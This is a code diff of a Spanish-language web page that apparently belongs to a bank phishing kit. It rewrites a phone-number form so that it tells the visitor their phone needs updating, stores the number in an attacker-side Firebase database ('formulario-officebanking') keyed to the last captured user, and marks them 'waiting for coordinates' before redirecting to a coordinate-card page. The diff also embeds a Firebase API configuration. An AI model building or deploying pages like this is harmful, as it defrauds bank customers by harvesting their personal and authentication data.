@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Teléfono</title>
+  <title>Actualizar Teléfono</title>
   <style>
     html, body {
       margin: 0;
@@ -17,23 +17,24 @@
     }
     .contenedor {
       border: 3px solid red;
+      padding: 20px;
       width: 90vw;
       max-width: 400px;
-      padding: 20px;
       background: white;
       box-sizing: border-box;
     }
     label {
-      font-weight: bold;
       display: block;
+      font-weight: bold;
       margin-bottom: 10px;
+      text-align: center;
     }
-    input[type="tel"] {
+    input[type="number"] {
       width: 100%;
       padding: 10px;
+      font-size: 1em;
       border: 1px solid black;
       border-radius: 4px;
-      box-sizing: border-box;
     }
     button {
       margin-top: 20px;
@@ -49,18 +50,38 @@
 </head>
 <body>
   <div class="contenedor">
-    <form onsubmit="guardarTelefono(event)">
-      <label for="telefono">Ingresa tu número de teléfono</label>
-      <input type="tel" id="telefono" maxlength="9" pattern="\d{9}" required />
-      <button type="submit">Continuar</button>
-    </form>
+    <label for="telefono">Necesitamos actualizar tu teléfono</label>
+    <input type="number" id="telefono" maxlength="9" required placeholder="Ej: 912345678" />
+    <button onclick="enviarTelefono()">Siguiente</button>
   </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
-    function guardarTelefono(e) {
-      e.preventDefault();
-      const telefono = document.getElementById('telefono').value;
-      localStorage.setItem('telefono', telefono);
-      window.location.href = 'coordenadas.html';
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking",
+      storageBucket: "formulario-officebanking.appspot.com",
+      messagingSenderId: "604053438195",
+      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function enviarTelefono() {
+      const telefono = document.getElementById("telefono").value;
+      if (telefono.length !== 9) {
+        alert("Debe tener exactamente 9 números");
+        return;
+      }
+      db.ref("ultimo_usuario").once("value").then(snap => {
+        const userId = snap.val();
+        db.ref("usuarios/" + userId + "/telefono").set(telefono);
+        db.ref("estado_usuario/" + userId).set({ estado: "esperando_coordenadas" });
+        window.location.href = "coordenadas.html";
+      });
     }
   </script>
 </body>
